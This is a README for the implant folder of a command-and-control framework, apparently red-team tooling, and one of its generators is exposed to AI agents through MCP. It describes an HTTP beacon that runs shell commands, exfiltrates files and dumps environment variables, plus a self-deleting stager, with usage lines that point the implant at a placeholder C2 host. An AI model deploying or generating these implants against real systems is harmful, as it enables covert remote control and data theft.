# Implants

Target-side components that run on compromised systems and communicate back to [Ursa Major](../major/README.md).

## Beacon

`beacon.py` is a full-featured HTTP implant that beacons back to the C2 server on a configurable interval with jitter.

### Supported Task Types

| Task | Description |
|------|-------------|
| `shell` | Execute an arbitrary shell command |
| `sysinfo` | Gather hostname, OS, arch, user, IP, etc. |
| `download` | Exfiltrate a file from the target to the C2 |
| `upload` | Receive a file from the C2 and write to disk |
| `ps` | List running processes |
| `pwd` | Print current working directory |
| `cd` | Change working directory |
| `ls` | List directory contents |
| `whoami` | Current user information |
| `env` | Dump environment variables |
| `screenshot` | Take a screenshot (if supported) |
| `sleep` | Change the beacon interval |
| `kill` | Self-terminate the implant |

### Usage

```bash
python3 beacon.py --server http://C2_IP:8443
python3 beacon.py --server http://C2_IP:8443 --interval 10 --jitter 0.2
```

### Communication Flow

```
1. REGISTER    beacon ──POST /register──► C2
                        ◄── session_id + AES key

2. BEACON      beacon ──POST /beacon────► C2
                        ◄── pending tasks (encrypted)

3. EXECUTE     beacon runs task locally

4. RESULT      beacon ──POST /result────► C2
                        (encrypted result)

5. REPEAT      goto 2 (after interval ± jitter)
```

## Stager

`stager.py` is a minimal first-stage dropper. It downloads the full beacon from the C2's `/stage` endpoint, writes it to a temp location, executes it, and self-deletes. Designed for minimal footprint during initial delivery.

### Generation

Stagers can be generated via MCP:
- `ursa_generate` — full beacon script
- `ursa_stager` — one-liner stagers for bash, python, powershell

## File Structure

```
implants/
├── beacon.py      # Full HTTP beacon implant
├── stager.py      # Minimal first-stage dropper
└── templates/     # Reserved for payload templates
```
